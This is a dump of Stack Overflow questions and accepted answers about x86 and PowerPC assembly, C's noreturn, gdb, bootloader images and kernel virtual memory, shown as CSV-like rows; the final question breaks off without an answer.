"Print decimal in 8086 emulator","7399","","<p>I implemented the multiplication of two big integer in <code>emu8086</code> with code as below :</p>

<pre><code>; MULTIPLY N1 * N2 = RES
MULTIPLY PROC
    MOV BH, 0H        

    MOV CH, 0H
    MOV CL, L1; initial counter of first loop ( L1 -&gt; length of N1 )
    DEC CX

    MUL_1:
        MOV COUNTER, CL ; store counter of first loop
        MOV CL, L2 ; initial counter of second loop ( L2 -&gt; length of N2 )

        MUL_2:
            MOV BH, 0H
            MOV BL, COUNTER
            DEC BL
            MOV AL, N1[BX] ; get BX th byte of N1

            MOV BL, CL
            DEC BL

            MUL N2[BX] ; multiple N1 and N2 's bytes

            MOV BH, 0H
            MOV BL, COUNTER
            ADD BX, CX
            DEC BX

            ADD RES[BX], AL ; AL should be add into RES[loop1_counter + loop2_counter - 1]
            ADC RES[BX+1], AH; AH and carry should be add into RES[loop1_counter + loop2_counter ]
            ADC RES[BX+2], 0H; carry of above addition should be place here.
        LOOP MUL_2     

        MOV CL, COUNTER; retrieve loop 1 counter 
    LOOP MUL_1   

    RET ; end function 
MULTIPLY ENDP
</code></pre>

<p>So, i want to print it in <code>Decimal Mode</code>, i know how to print result in <code>HexaDecimal</code> :</p>

<pre><code>PRINT_TABLE PROC
    MOV CX, 16D

    CASE:
        MOV BX, 16D
        SUB BX, CX

        MOV AL, RES[BX]

        CMP AL, 10D
        JB LBL1
        JAE LBL2


        LBL1:
            ADD AL, '0'
            JMP CONTINUE

        LBL2:
            ADD AL, 55D

        CONTINUE:

        MOV DL, AL
        MOV AH, 02H
        INT 21H        
    LOOP CASE
    RET
PRINT_TABLE ENDP
</code></pre>

<p>Could any one please help me to print my result in Decimal Mode ?</p>

<p>Thanks for your advance :)</p>
","<p>I solved my problem with changing my code as below :</p>

<pre><code>NORMALIZE PROC
    MOV CH, 0H
    MOV CL, L1
    ADD CL, L2
    DEC CX

    NOMRALIZE_LOOP:
        MOV BX, CX
        DEC BX
        MOV AL, RES[BX]
        MOV AH, 1H
        MUL AH
        AAM            
        MOV RES[BX], AL
        ADD RES[BX-1], AH
    LOOP NOMRALIZE_LOOP
    RET
NORMALIZE ENDP

; MULTIPLY N1 * N2 = RES
MULTIPLY PROC
    MOV CH, 0H
    MOV CL, L1

    MOV AL, '0'

    MOV BH, 0H

    SUB_N1:
        MOV BL, CL 
        DEC BL
        SUB N1[BX], AL
    LOOP SUB_N1

    MOV CL, L2

    SUB_N2:
        MOV BL, CL
        DEC BL
        SUB N2[BX], AL
    LOOP SUB_N2

    MOV CH, 0H
    MOV CL, L1

    MUL_1:
        MOV COUNTER, CL
        MOV CL, L2  

        MUL_2:
            MOV BH, 0H
            MOV BL, COUNTER
            DEC BL
            MOV AL, N1[BX]

            MOV BL, CL
            DEC BL

            MUL N2[BX]

            AAM

            MOV BH, 0H
            MOV BL, COUNTER
            ADD BX, CX
            DEC BX
            DEC BX

            ADD RES[BX], AL
            ADC RES[BX-1], AH
            ADC RES[BX-2], 0H
        LOOP MUL_2     

        MOV CL, COUNTER
    LOOP MUL_1

    RET
MULTIPLY ENDP
</code></pre>

<p>I changed the multiplication and storing numbers with <code>AAM</code> function. At the end, i add <code>NORMALIZE</code> function to convert result to decimal. :)</p>

<p>Hope others can use it :)</p>
","9117165"
"Why does ""noreturn"" function return?","7397","","<p>I read <a href=""https://stackoverflow.com/questions/10538291/what-is-the-point-of-noreturn"">this</a> question about <code>noreturn</code> attribute, which is used for functions that don't return to the caller.</p>

<p>Then I have made a program in C.</p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdnoreturn.h&gt;

noreturn void func()
{
        printf(""noreturn func\n"");
}

int main()
{
        func();
}
</code></pre>

<p>And generated assembly of the code using <a href=""https://gcc.godbolt.org/"" rel=""nofollow noreferrer"">this</a>:</p>

<pre><code>.LC0:
        .string ""func""
func:
        pushq   %rbp
        movq    %rsp, %rbp
        movl    $.LC0, %edi
        call    puts
        nop
        popq    %rbp
        ret   // ==&gt; Here function return value.
main:
        pushq   %rbp
        movq    %rsp, %rbp
        movl    $0, %eax
        call    func
</code></pre>

<p><strong>Why does function <code>func()</code> return after providing <code>noreturn</code> attribute?</strong></p>
","<p>The function specifiers in C are a <em>hint</em> to the compiler, the degree of acceptance is implementation defined.</p>

<p>First of all, <code>_Noreturn</code> function specifier (or, <code>noreturn</code>, using <code>&lt;stdnoreturn.h&gt;</code>) is a hint to the compiler about a <em>theoretical promise</em> made by the programmer that this function will never return. Based on this promise, compiler can make certain decisions, perform some optimizations for the code generation. </p>

<p>IIRC, if a function specified with <code>noreturn</code> function specifier eventually returns to its caller, either</p>

<ul>
<li>by using and explicit <code>return</code> statement</li>
<li>by reaching end of function body</li>
</ul>

<p>the <a href=""https://en.wikipedia.org/wiki/Undefined_behavior"" rel=""noreferrer"">behaviour is undefined</a>. You <strong>MUST NOT</strong> return from the function. </p>

<p>To make it clear, using <code>noreturn</code> function specifier <strong>does not stop</strong> a function form returning to its caller. It is a promise made by the programmer to the compiler to allow it some more degree of freedom to generate optimized code.</p>

<p>Now, in case, you made a promise earlier and later, choose to violate this, the result is UB. Compilers are encouraged, but not required, to produce warnings when a <code>_Noreturn</code> function appears to be capable of returning to its caller.</p>

<p>According to chapter §6.7.4, <code>C11</code>, Paragraph 8</p>

<blockquote>
  <p>A function declared with a <code>_Noreturn</code> function specifier shall not return to its caller.</p>
</blockquote>

<p>and, the paragraph 12, (<em>Note the comments!!</em>)</p>

<blockquote>
<pre><code>EXAMPLE 2
_Noreturn void f () {
abort(); // ok
}
_Noreturn void g (int i) { // causes undefined behavior if i &lt;= 0
if (i &gt; 0) abort();
}
</code></pre>
</blockquote>

<hr>

<p>For <code>C++</code>, the behaviour is quite similar. Quoting from chapter §7.6.4, <code>C++14</code>, paragraph 2 (<em>emphasis mine</em>)</p>

<blockquote>
  <p><strong>If a function <code>f</code> is called where <code>f</code> was previously declared with the <code>noreturn</code> attribute and <code>f</code> eventually
  returns, the behavior is undefined.</strong> <em>[ Note: The function may terminate by throwing an exception. —end
  note ]</em> </p>
  
  <p><em>[ Note: Implementations are encouraged to issue a warning if a function marked <code>[[noreturn]]</code> might
  return. —end note ]</em></p>
  
  <p>3 <em>[ Example:</em></p>

<pre><code>[[ noreturn ]] void f() {
throw ""error""; // OK
}
[[ noreturn ]] void q(int i) { // behavior is undefined if called with an argument &lt;= 0
if (i &gt; 0)
throw ""positive"";
}
</code></pre>
  
  <p><em>—end example ]</em></p>
</blockquote>
","45981594"
"Get the first bit of the EAX register in x86 assembly language","7387","","<p>In x86 assembly language, is it possible to obtain the first bit of a register? I want to obtain the first bit of the <code>eax</code> register and move it into <code>ebx</code>, but I'm not sure how to do this yet.</p>

<pre><code>.stack 2048

.data

ExitProcess proto, exitcode:dword 

.code
start:
mov eax, 3;
;now I want to move the first bit of eax into ebx. How can I obtain the first bit from eax?
invoke  ExitProcess, 0
end start
</code></pre>
","<p>If by ""first bit"" you mean the least significant bit, then try:</p>

<pre><code> ...
 mov   ebx, eax
 and   ebx, 01
</code></pre>

<p>You apparently don't understand that instructions operate on <em>all</em> the bits in a named register at once, and the ""and"" instructions combine their operands bit-by-bit.</p>

<p>The following works, too, and is arguably a more direct interpretation of your request (""get the first bit of eax, and then put in EBX"") but it destroys the contents of EAX:</p>

<pre><code> ...
 and   eax, 1
 mov   ebx, eax
</code></pre>

<p>In assembly code, because you have few registers, their contents tend to be precious, so destroying one register's content in computing a new result is generally avoided. (When you can't, you can't, but this case it is easy to avoid).</p>

<p>Finally, you could write:</p>

<pre><code> ...
 mov   ebx, 1
 and   ebx, eax
</code></pre>

<p>This works fine, and is just as fast as the other two.  I prefer the first because it emphasizes IMHO the value I care about (content of EAX) by virtue of mentioning it first, over the ""1"", which is just an incidental constant.   This kind of style may not seem like it matters much, but if you write a lot of code, <em>especially</em> arcane stuff such as assembler, doing it to maximize later readability is worth a lot.</p>

<p>It is worth your trouble to find the Intel reference manuals, and <em>read</em> them carefully to understand what each machine instruction does.  That seems like a daunting task because its a big book; just focus on the instructions you initially seem to need.</p>
","15239624"
"LOCK prefix of Intel instruction. What is the point?","7378","","<p>I read the Intel manual and found there is a lock prefix for instructions, which can prevent processors writing to the same memory location at the same time. I am quite excited about it. I guess it could be used as hardware mutex. So I wrote a piece of code to have a shot. The result is quite frustrating. The lock does not support MOV or LEA instructions. The manual says LOCK only supports ADD, ADC, AND, BTC, BTR, BTS, CMPXCHG, CMPXCH8B, DEC, INC, NEG, NOT, OR, SBB, SUB, XOR, XADD, and XCHG. What is more, if the LOCK prefix is used with one of these instructions and the source operand is a memory operand, an undefined opcode exception (#UD) may be generated.</p>

<p>I wonder why so many limitations, so many restrictions make LOCK seem useless. I cannot use it to guarantee a general write operation not have dirty data or other problems caused by parallelism.</p>

<p>E.g. I wrote code ++(*p) in C. p is pointer to a shared memory. The corresponding assembly is like:</p>

<pre><code>movl    28(%esp), %eax
movl    (%eax), %eax
leal    1(%eax), %edx
movl    28(%esp), %eax
movl    %edx, (%eax)
</code></pre>

<p>I added ""lock"" before ""movl"" and ""leal"", but the processor complains ""Invalid Instruction"". :-( I guess the only way to make the write operations serialized is to use software mutex, right?</p>
","<p>I certainly would not call <code>lock</code> useless. <code>lock cmpxchg</code> is the standard way to perform <a href=""http://en.wikipedia.org/wiki/Compare-and-swap"">compare-and-swap</a>, which is the basic building block of many synchronization algorithms.</p>

<p>Also, see <a href=""http://en.wikipedia.org/wiki/Fetch-and-add"">fetch-and-add</a>.</p>
","11065707"
"How to view the disassembly in Code::Blocks?","7377","","<p>I read <a href=""http://altdevblogaday.com/2011/11/09/a-low-level-curriculum-for-c-and-c/"" rel=""noreferrer"">this article</a> about some low level underpinnings of C/C++, and the author is basically showing us through the assembly code generated by the compiler, line by line. He is using VS 2010, but I don't, I use Code::Blocks. How do I view the disassembly there? When I go to debugger, and click disassembly, it shows me a blank window...</p>

<p>This is the C++ (.cpp) code (the whole code) I compiled:</p>

<pre><code>int main()
{
    int x = 1;
    int y = 2;
    int z = 0;

    z = x + y;

    return 0;
}
</code></pre>
","<p>The kind of disassembly that the author shows in the article is called <code>inter-leaved disassembly</code> ( C and disassembly interleaved ) which a few IDEs like Visual Studio support. Code Blocks does not support. But Code Blocks has a separate disassembly window like this</p>

<p><img src=""https://i.stack.imgur.com/LdIaZ.png"" alt=""Diassembly Window""></p>

<p>Select a source line. Right Click. Say <code>Run to Cursor</code>. Now <code>Debug-&gt;Debugging Windows-&gt;Disassembly</code>. Instead of Run to cursor you can also set break points and then do this. But somehow it wasn't going well with mine, so I am suggesting <code>Run to Cursor</code> method.</p>

<p>Hope it helps.</p>
","9620462"
"GNU Assembler comments","7373","","<p>This is indeed a stupid idiosyncrasy of mine, but I can't stand the way GNU AS uses to insert a comment.  I am too accustomed to the Sun way (the same used in most UNIX assemblers), that uses a simple slash ""/"" to comment out the code till the end of the line.</p>

<p>Do you know of a way to accomplish my little whim?</p>
","<p>Yes, keep using <code>#</code> and you'll get used to it.</p>

<p>There may be ways of getting <code>/</code> to work but then your code isn't just processor-specific but literally computer-specific.  You're better-off getting used to small things than completely destroying the portability of your code to fancy a whim.</p>
","15665019"
"How to make an bootable iso(not cd or flash drive) for testing your own boot loader?","7367","","<p>i am trying to write a boot loader(hello world sort). i am using Bochs for simulation (platform Linux-Ubuntu). But i am unable to make an bootable iso for my binary file. Though in tutorial VFD(virtual floppy disk) is used but it is for windows platform. Here is my code for bootloader ( just for testing)</p>

<pre><code>;*********************************************
;    Boot1.asm
;        - A Simple Bootloader for testing if cd is booting or not
;
;    Operating Systems Development Tutorial
;*********************************************

[BITS 16]    ;tell the assembler that its a 16 bit code
[ORG 0x7C00]    ;Origin, tell the assembler that where the code will

Start:

    cli                    ; Clear all Interrupts
    hlt                    ; halt the system

times 510 - ($-$$) db 0                ; We have to be 512 bytes. Clear the rest of the bytes with 0

dw 0xAA55                    ; Boot Signature
</code></pre>

<p>i tried master ISO on Ubuntu. It is converting the binary file to ISO but not to bootable ISO. Bochs is showing error ""cd is not eltorito"" which i googled and found to be standard for bootable ISO.What additional things i have to add to it to make it bootable. i have already added boot signature in the end.
Can anyone suggest a reliable application to make a bootable ISO on Ubuntu?
My work is stuck due to this....
OR
i am pretty sure a lot of people must be involved in OS development on Linux platform. How do you people test?</p>

<p>I have made a bootable flash-drive with Unetbootin with the iso of my bootloader program. 
switched to Virtual-box and twisted a bit to boot from pendrive, but still its showing it to be non-bootable.
I think someone said it correctly that u need a lot of patience in OS development.  </p>

<hr>

<p>:phew finally my bootloader program ran...<br>
I used virtual floppy image to boot my program on Virtual box. Here are the steps in case somebody is struggling with it.<br>
1.Create boot.asm which have your bootloader program.<br>
2.Compile with nasm. nasm  -f bin boot.asm -o boot.bin.<br>
3.sudo mkfs.msdos -C /home/<em>username</em>/floppy.img 1440<br>
4.sudo chown <em>username</em> ./floppy.img.   <a href=""http://ubuntu-virginia.ubuntuforums.org/showthread.php?t=1538884"" rel=""nofollow"" title=""orignal"">link text</a><br>
5.Copy with dd. dd if=./boot.bin of=./floppy.img.<br>
6.Run VirtualBox and select floppy.img as booting device in your new virtual machine.<br>
PS: you can also attach floppy.img to device ""loop"" and mount it just as a real floppy disk.</p>
","<p>a very simple script will do this in linux as below :- </p>

<pre><code>rm -f disk_images/myos.iso
mkisofs -quiet -V 'MYOS' -input-charset iso8859-1 -o disk_images/myos.iso -b myos.flp disk_images/ || exit
</code></pre>

<p>The floppy drive is made as below :-</p>

<pre><code>nasm -f bin -o boot.bin boot.asm
dd if=boot.bin of=floppy.img count=1 bs=512 //for the bootloader
</code></pre>

<p>and</p>

<pre><code>dd if=boot.bin of=floppy.img skip seek=1 count=1339 //assuming a 1.44Mb floppy
</code></pre>

<p>and then you have the file system </p>

<pre><code>mkdosfs (or whatever system you want ) -C floppy.img 1440
</code></pre>

<p>If you ned help for windows , let me know :)</p>
","5462351"
"How does MOVSX assembly instruction work?","7355","","<p>How does the assembly instruction MOVSX work in this following example:</p>

<p><code>MOVSX ECX,BYTE PTR DS:[EDX]</code></p>

<p>In this case, here are the state of the registers:<br>
<code>ECX = 0000000F</code><br>
<code>EDX = 0012FD9F</code>  </p>

<p>From what I thought, it takes last bytes of [EDX] = 9F, moves it to ECX and then sign extends it to match 16 bits = 0000009F. However, the actual result is 00000016. Can someone help explain where I'm wrong?</p>
","<p>That's partially correct. However:</p>

<p><code>BYTE PTR DS:[EDX]</code> obtains the <strong>byte located at the address held in EDX</strong>. This byte is copied to <code>ECX</code> into the least significant byte and the rest is filled with the sign of the byte.</p>

<p>For your unexpected result, this means that at the memory address<sup>1</sup> <code>0x12FD9F</code> the byte <code>0x16</code> is located.</p>

<hr>

<p>Notes:</p>

<ul>
<li>the Segment Override Prefix <code>DS:</code> isn't necessary here. <code>[EDX]</code> automatically refers to <code>DS</code>.</li>
</ul>

<hr>

<p><sup>1</sup> ""memory address"" refers to either virtual or physical memory here</p>
","33269023"
"PowerPC opcode table?","7353","","<p>I am interested in developing a PowerPC emulator for my own learning purposes. I've found a fair amount of resources about programming in PowerPC assembly, but after quite some time looking, I haven't been able to find an instruction/opcode mapping table anywhere yet. Of course, I need the opcodes to be able to write an emulator. Where can I find one?</p>
","<p>I did some more hunting and found documentation on IBM's website. <a href=""http://www.ibm.com/developerworks/systems/library/es-archguide-v2.html"" rel=""nofollow"">This page</a> links to three books of documentation, of which <a href=""http://download.boulder.ibm.com/ibmdl/pub/software/dw/library/es-ppcbook1.zip"" rel=""nofollow"">the first one</a> contains all relevant information about PowerPC instructions.</p>

<p>I was initially confused by seeing that many instructions all had the same OPCODE field value, and thought, ""How will we distinguish the instructions then?"". However, in section 1.7, ""Instruction formats"", many of the instruction forms that are used throughout the architecture actually have a two-part opcode; the first part being the six-bit OPCODE field at the high end of the instruction, and the second part being a field called XO, which contains extra identification for the opcode. Its size and location varies depending on the instruction format.</p>
","6081975"
"x86 Video mode Clear Screen","7335","","<p>Hello I'm trying to clear the screen in DOS video mode with this code.</p>

<p>But when I run it, the dot is still there! </p>

<pre><code>    org 100h

    mov     ah, 0       ; set display mode function.
    mov     al, 13h     ; mode 13h = 640x480 pixels, 256 colors.
    int     10h         ; set it!

    mov     cx, 10      ; column
    mov     dx, 10      ; row
    mov     al, 15      ; white
    mov     ah, 0ch     ; put pixel
    int     10h         ; draw pixel

    ; -------  clear the screen ----------     
    ; -------  doesn't work! dot is still there

    mov ax,0B800h
    mov es,ax
    xor di,di
    xor ax,ax
    mov cx,2000d
    cld
    rep stosw

    ; -------------------------------------

    ;wait for keypress
    mov ah,00
    int 16h

    mov ax, 4c00h ; exit to operating system.
    int 21h

    ;======================================================
</code></pre>

<p>I tried resetting the video mode with INT 10 but this gives me blinks which is unwanted inside my loop</p>
","<p>There are some issues with your code.</p>

<p>First, BIOS mode 13h is not 640x480 at 8 bits/pixel, it's 320x200 at 8 bits/pixel.</p>

<p>B800h is the address of BIOS text modes. BIOS graphics modes use A000h.</p>

<p>So it should be:</p>

<pre><code>mov ax,0A000h
mov es,ax
</code></pre>

<p>320x200 at 8 bits consumes 320*200 = 64 000 bytes of video memory. So the value of <code>cx</code> is incorrect. It should be:</p>

<pre><code>mov cx,32000d
cld
rep stosw
</code></pre>
","13979426"
"Assembly Test Instruction","7298","","<p>I want to know what does this operation mean?</p>

<pre><code>Test EDX, 200
</code></pre>

<p>I have <code>DWORD</code> value in <code>EDX</code> like:</p>

<pre><code>1A1B1C00
</code></pre>

<p>When I do <code>test EDX, 200</code>
and then a <code>JE</code>, jump is taken. Why? <code>EDX</code> is not equal to <code>200</code>.</p>

<p>I want to know more about <code>Test EDX, 200</code> meaning.</p>
","<p>A <code>test</code> performs an <code>AND</code> without modifying the operands (it only modifies some flags, like <code>ZF</code> et al). A <code>je</code> simply tests <code>ZF</code> (the zero flag) and jumps if set.</p>

<p>So <code>Test EDX, 200</code> will <code>AND</code> the value in <code>EDX</code> with <code>0x200</code> and set <code>ZF</code> to <code>1</code> if the result of that <code>AND</code> was <code>0</code>.  In your case that will give us:</p>

<pre><code>0x1A1B1C00 AND 0x00000200 -&gt; 0x00000000
</code></pre>

<p>Since <code>0x0200</code> is <code>0000 0010 0000 0000</code> in binary, the intent of the instruction <code>Test EDX, 200</code> is to test the value in <code>EDX</code> and see if the 9th bit (9  places from the right counting from 0) is a <code>0</code> or <code>1</code>, and take the jump if it is a zero.</p>
","13720145"
"What does the Kernel Virtual Memory of each process contain?","7285","","<p>When say 3 programs (executables) are loaded into memory the layout might look something like this:</p>

<p><a href=""http://img97.imageshack.us/img97/3460/processesm.jpg"">alt text http://img97.imageshack.us/img97/3460/processesm.jpg</a></p>

<p>I've following questions:</p>

<ol>
<li><p>Is the concept of Virtual Memory limited to user processes? Because, I am wondering where does the Operating System Kernel, Drivers live? How is its memory layout? I want to know more about kernel side memory. I know its operating system specific make your choice (windows/linux).</p></li>
<li><p>Is the concept of Virtual Memory per process basis? I mean is it correct for me to say 4GB of process1 + 4GB of process2 + 4GB of process3 = 12GB of virtual memory (for all processes). This does't sound right. Or from a total of 4GB space 1GB is taken by kernel &amp; rest 3GB is shared b/w all processes. </p></li>
<li><p>They say, on a 32 bit machine in a 4GB address space. Half of it (or more recently 1GB) is occupied by kernel. I can see in this diagram that ""Kernel Virtual memory"" is occupying 0xc0000000 - 0xffffffff (= 1 GB). Are they talking about this? or is it something else? Just want to confirm.</p></li>
<li><p>What <strong>exactly</strong> does the <code>Kernel Virtual Memory</code> of each of these processes contain? What is its layout?</p></li>
<li><p>When we do IPC we talk about shared memory. I don't see any memory shared between these processes. Where does it live?</p></li>
<li><p>Resources (files, registries in windows) are global to all processes. So, the resource/file handle table must be in some global space. Which area would that be in?</p></li>
<li><p>Where can I know more about this kernel side stuff.</p></li>
</ol>
","<ol>
<li><p>When a system uses virtual memory, the kernel uses virtual memory as well. Windows will use the upper 2GB (or 1GB if you've specified the /3GB switch in the Windows bootloader) for its own use. This includes kernel code, data (or at least the data that is paged in -- that's right, Windows can page out portions of the kernel address space to the hard disk), and page tables.</p></li>
<li><p>Each process has its own VM address space. When a process switch occurs, the page tables are typically swapped out with another process's page table. This is simple to do on an x86 processor - changing the page table base address in the <code>CR3</code> control register will suffice. The entire 4GB address space is replaced by tables replacing a completely different 4GB address space. Having said that, typically there will be regions of address space that are shared between processes. Those regions are marked in the page tables with special flags that indicate to the processor that those areas do not need to be invalidated in the processor's <a href=""http://en.wikipedia.org/wiki/Translation_lookaside_buffer"" rel=""noreferrer"">translation lookaside buffer</a>.</p></li>
<li><p>As I mentioned earlier, the kernel's code, data, and the page tables themselves need to be located somewhere. This information is located in the kernel address space. It is possible that certain parts of the kernel's code, data, and page tables can themselves be swapped out to disk as needed. Some portions are deemed more critical than others and are never swapped out at all.</p></li>
<li><p>See (3)</p></li>
<li><p>It depends. User-mode shared memory is located in the user-mode address space. Parts of the kernel-mode address space might very well be shared between processes as well. For example, it would not be uncommon for the kernel's code to be shared between all processes in the system. Where that memory is located is not precise. I'm using arbitrary addresses here, but shared memory located at <code>0x100000</code> in one process might be located at <code>0x101000</code> inside another process. Two pages in different address spaces, at completely different addresses, can point to the same physical memory.</p></li>
<li><p>I'm not sure what you mean here. Open file handles are not global to all processes. The file system stored on the hard disk is global to all processes. Under Windows, file handles are managed by the kernel, and the objects are stored in the kernel address space and managed by the kernel object manager.</p></li>
<li><p>For Windows NT based systems, I'd recommend <a href=""http://rads.stackoverflow.com/amzn/click/0735625301"" rel=""noreferrer"">Windows Internals, 5ed</a> by Mark Russinovich and David Solomon</p></li>
</ol>

<p>Response to comment:</p>

<blockquote>
  <p>And now this 3GB is shared b/w all
  processes? or each process has 4GB
  space?</p>
</blockquote>

<p>It depends on the OS. Some kernels (such as the <a href=""http://en.wikipedia.org/wiki/L4_microkernel_family"" rel=""noreferrer""><code>L4</code> microkernel</a>) use the same page table for multiple processes and separate the address spaces using <a href=""http://en.wikipedia.org/wiki/Memory_segmentation"" rel=""noreferrer"">segmentation</a>. On Windows each process gets its own page tables. Remember that even though each process might get its own <em>virtual</em> address space, that doesn't mean that the <em>physical</em> memory is always different. For example, the image for <code>kernel32.dll</code> loaded in process A is shared with <code>kernel32.dll</code> in process B. Much of the kernel address space is also shared between processes.</p>

<blockquote>
  <p>Why does each process have kernel
  virtual memory?</p>
</blockquote>

<p>The best way to think of this is to ask yourself, ""How would a kernel work if it didn't execute using virtual memory?"" In this hypothetical situation, every time your program caused a context switch into the kernel (let's say you made a system call), virtual memory would have to be disabled while the CPU was executing in kernel space. There's a cost to doing that and there's a cost to turning it back on when you switch back to user space.</p>

<p>Furthermore, let's suppose that the user program passed in a pointer to some data for its system call. This pointer is a virtual address. You've got virtual memory turned off, so that pointer needs to be translated to a physical address before the kernel can do anything with it. If you had virtual memory turned on, you'd get that for free thanks to the memory-management unit on the CPU. Instead you'd have to manually translate the addresses in software. There's all kinds of examples and scenarios that I could describe (some involving hardware, some involving page table maintenance, and so on) but the gist of it is that it's much easier to have a homogeneous memory management scheme. If user space is using virtual memory, it's going to be easier to write a kernel if you maintain that scheme in kernel space. At least that has been my experience.</p>

<blockquote>
  <p>there will be only one instnace of OS
  kernel right? then why each process
  has seperate kernel virtual space?</p>
</blockquote>

<p>As I mentioned above, quite a bit of that address space will be shared across processes. There is per-process data that is in the kernel space that gets swapped out during a context switch between processes, but lots of it is shared because there is only one kernel.</p>
","2445345"
"Recursive Fibonacci in MASM Assembly","7275","","<p>So I am creating a program to give the nth term of the Fibonacci sequence. I am supposed to implement the following logic using recursive MASM assembly. </p>

<pre><code>int fib(int n){ 
 if ((n == 1) || (n == 2)) 
     return n - 1; 
 else 
     return fib(n-1) + fib(n-2); 
}
</code></pre>

<p>The issue I seem to be having is retaining the values as the program cycles through until reaching 1. I am fairly unexperienced with recursion and I feel like I am missing something in that aspect. I am not sure how to retain the values to add them.</p>

<pre><code>.code
main PROC
    mov ecx,0
    push 4          ; calculate the nth fib
    call Fib            ; calculate fib (eax)
    call WriteDec
    call Crlf
    exit
main ENDP

Fib PROC
    add ecx,1
    push ebp
    mov  ebp,esp
    mov  eax,[ebp+8]    ; get n
    cmp  eax,2      ; n == 2?
    je   exception2     
    cmp  eax,1      ; n == 1?
    je   exception2         
    dec eax
    push eax            ; Fib(n-1)
    call fib

    add eax,
    jmp Quit


Exception2:
    dec eax
Quit:
    pop  ebp            ; return EAX
    ret  4          ; clean up stack
Fib ENDP

END main
</code></pre>
","<p>At the end of the procedure you must restore <code>ESP</code> not only <code>EBP</code>.</p>

<p><code>ret  4</code> (stdcall) is in this case not convenient because you can reuse the value on the stack for the second call.</p>

<p>For the result of the first call you can use a local variable which will be created on the ""current"" stack.</p>

<p>Don't mix lower and upper case in symbols even if an OPTION-directive allows it!</p>

<p>I changed your code accordingly:</p>

<pre><code>include Irvine32.inc

.code
main PROC
    mov ecx,0
    push 10             ; calculate the nth fib
    call fib            ; calculate fib (eax)
    add esp, 4          ; clean up the stack

    call WriteDec
    call Crlf
    exit
main ENDP

fib PROC C
    add ecx,1
    push ebp
    mov  ebp,esp
    sub  esp, 4         ; space for a local dword [ebp-4]
    mov  eax,[ebp+8]    ; get n

    ; if ((n == 1) || (n == 2)) return 1;
    cmp  eax,2          ; n == 2?
    je   exception2
    cmp  eax,1          ; n == 1?
    je   exception2

    ;else return fib(n-1) + fib(n-2);
    dec eax
    push eax            ; Fib(n-1)
    call fib
    mov [ebp-4], eax    ; store first result

    dec dword ptr [esp] ; (n-1) on the stack -&gt; (n-2)
    call fib
    add esp, 4          ; clean up stack

    add eax, [ebp-4]    ; add result and stored first result

    jmp Quit

exception2:
    mov eax, 1          ; start values: 1, 1
    ; dec eax           ; start values: 0, 1
Quit:
    mov esp, ebp        ; restore esp
    pop ebp             ; restore ebp

    ret                 ; return EAX, stack not cleaned up
fib ENDP

END main
</code></pre>
","23513135"
"Store and Retrieve a number from memory in 8086 assembly language","7270","","<p>I'm a total beginner to 8086 assembly language. I want to try some simple stuff first. How do write a program, to enter a number, say <strong>x</strong>, store it in memory and then later on load it to a register, and display it? </p>

<p>I did something like this :</p>

<pre><code>.MODEL SMALL

.DATA
    NL2     DB      0AH,0DH,'Enter a number:','$'
.CODE
MAIN PROC
    MOV si, 100d
    LEA DX,NL2 ; 
    MOV AH,09H  ; 
    INT 21H
    MOV AH,0AH  ; Read into buffer
    MOV [si],0AH ; Store in memory
    MOV BX,[si] ; load from memory to bx
    MOV BX, 09H ; display it
    INT 21H
   .EXIT

    MAIN    ENDP
            END     MAIN
</code></pre>

<p>What's the mistake? Please help me! Thanks!</p>
","<p>There is two mistakes in above code</p>

<ol>
<li><p>The <code>$</code> sign have to be in quotes otherwise error can be generate.</p></li>
<li><p>After taking the input we have to <code>mov</code> the value of <code>al</code> in <code>dl</code>, to print the entered value on screen.</p></li>
</ol>
","26987066"
"NASM Linux Assembly Printing Integers","7268","","<p>I am trying to print a single digit integer in nasm assembly on linux. What I currently have compiles fine, but nothing is being written to the screen. Can anyone explain to me what I am doing wrong here?</p>

<pre><code>section .text
    global _start

_start:
    mov ecx, 1          ; stores 1 in rcx
    add edx, ecx        ; stores ecx in edx
    add edx, 30h        ; gets the ascii value in edx
    mov ecx, edx        ; ascii value is now in ecx
    jmp write           ; jumps to write


write:
    mov eax, ecx        ; moves ecx to eax for writing
    mov eax, 4          ; sys call for write
    mov ebx, 1          ; stdout

    int 80h             ; call kernel
    mov eax,1           ; system exit
    mov ebx,0           ; exit 0
    int 80h             ; call the kernel again 
</code></pre>
","<p>This is adding, not storing:</p>

<pre><code>add edx, ecx        ; stores ecx in edx
</code></pre>

<p>This copies ecx to eax and then overwrites it with 4:</p>

<pre><code>mov eax, ecx        ; moves ecx to eax for writing
mov eax, 4          ; sys call for write
</code></pre>

<p>EDIT:</p>

<p>For a 'write' system call:</p>

<pre><code>eax = 4
ebx = file descriptor (1 = screen)
ecx = address of string
edx = length of string
</code></pre>
","6903702"
"Using gdb to check register's values","7268","","<p>How can I see what values the registers hold? I have the following line of assembly:</p>

<pre><code> mov 0x8(%rax), %rax
 cpm %ebx, (%rax)
</code></pre>

<p>Using the command:</p>

<pre><code> (gdb) p/x $ebx
 (gdb) p/x $rbx
 $3 = 0xb
</code></pre>

<p>I get the value that is stored in this register. However, when I try to see what it is stored int the memory location (%rax) I have the following problem:</p>

<pre><code>(gdb) display *(int *)$rax
Disabling display 10 to avoid infinite recursion.
10: *(int *)$rax = Cannot access memory at address 0x17
</code></pre>

<p>I cannot not understand why this happens and moreover how to find out what (%rax) has in.</p>
","<p>To see the values of the registers just use</p>

<pre><code>print $rax
info register $rax
info register
</code></pre>

<p>In your case it seems <code>rax</code> contains the number <code>0x17</code> and the debugger cannot access this location. Please make sure that <code>rax</code> contains a valid address pointing to an integer.</p>

<p>You should use <code>print</code> instead of <code>display</code> if you want to take a quick view. Dont abuse the <code>display</code> command. You can use it if you need a kind of watchdog for an expression.</p>

<p>Here you find a quick reference</p>

<p><a href=""http://www.yolinux.com/TUTORIALS/GDB-Commands.html"" rel=""nofollow"">http://www.yolinux.com/TUTORIALS/GDB-Commands.html</a> </p>

<p>hope it helps.</p>
","13284196"
"addressing array elements in nasm","7251","","<p>I'm very new to assembly and NASM and there is a code:</p>

<pre><code>    SECTION .data       
array db 89, 10, 67, 1, 4, 27, 12, 34, 86, 3
wordvar dw      123     

    SECTION .text       
        global main     
main:               

    mov eax, [wordvar]
    mov ebx, [array+1]
    mov ebx,0       
    mov eax,1       
    int 0x80    
</code></pre>

<p>Then I run the executable through GDB eax register is set to value 123 as intended, but in ebx there is some mess instead of the array elements value.  </p>
